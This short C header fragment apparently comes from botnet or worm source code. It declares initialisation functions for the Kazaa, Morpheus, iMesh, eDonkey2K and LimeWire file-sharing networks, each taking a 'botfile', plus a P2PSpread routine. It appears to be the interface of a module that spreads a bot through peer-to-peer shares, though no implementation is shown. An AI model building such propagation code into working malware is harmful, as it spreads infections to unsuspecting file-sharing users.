#ifndef NO_P2P
void KazaaInit(char *botfile);
void MorpheusInit(char *botfile);
void iMeshInit(char *botfile);
void eDonkey2KInit(char *botfile);
void LimeWireInit(char *botfile);
void P2PSpread(void);
#endif